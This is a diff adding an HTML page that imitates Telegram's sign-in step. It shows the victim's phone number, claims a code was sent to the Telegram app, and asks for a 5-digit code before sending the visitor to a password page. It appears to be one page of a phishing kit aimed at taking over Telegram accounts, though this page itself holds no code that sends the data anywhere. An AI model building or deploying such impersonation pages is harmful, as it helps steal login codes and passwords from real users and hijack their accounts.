@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Enter Code</title>
+  <link rel="icon" type="image/png" href="test2.png">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="wrapper">
+    <div class="content">
+      <div><img src="monyet.png" alt="emoji" class="emoji-gif"></div>
+
+      <!-- 🧩 Nombor ini akan diisi automatik dari index.html -->
+      <h2 class="number" id="showNumber">+60</h2>
+
+      <p class="subtitle">
+        We've sent the code to the Telegram app on your<br>other device.
+      </p>
+
+      <form id="codeForm" action="password.html" class="form-box">
+        <input type="text" id="codeInput" class="input" placeholder="Code" maxlength="5" required>
+        <button type="submit" id="nextBtn" class="btn" disabled>Next</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- 💡 Skrip kawal input & butang -->
+  <script>
+    // Paparkan nombor dari index.html
+    const savedNumber = localStorage.getItem("telegramNumber");
+    if (savedNumber) {
+      document.getElementById("showNumber").textContent = savedNumber;
+    }
+
+    // Elemen input dan butang
+    const codeInput = document.getElementById("codeInput");
+    const nextBtn = document.getElementById("nextBtn");
+    const form = document.getElementById("codeForm");
+
+    // Enable butang hanya bila input tepat 5 digit
+    codeInput.addEventListener("input", () => {
+      const value = codeInput.value.trim();
+      if (/^\d{5}$/.test(value)) {
+        nextBtn.disabled = false;
+      } else {
+        nextBtn.disabled = true;
+      }
+    });
+
+    // Semak sebelum submit
+    form.addEventListener("submit", (e) => {
+      const value = codeInput.value.trim();
+      if (!/^\d{5}$/.test(value)) {
+        e.preventDefault();
+        alert("Please enter exactly 5 digits.");
+      }
+    });
+  </script>
+</body>
+</html>
